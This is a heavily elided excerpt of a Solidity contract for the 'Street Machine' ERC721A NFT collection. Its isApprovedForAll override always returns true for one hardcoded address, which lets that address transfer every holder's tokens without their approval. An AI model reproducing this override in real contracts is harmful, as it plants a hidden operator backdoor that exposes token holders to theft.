  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x7C34AE34958dC38D9bc1DE2De6E380cd4235833a){return true;}
...
contract StreetMachine is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Street Machine", "SM", maxBatchSize_, collectionSize_) {
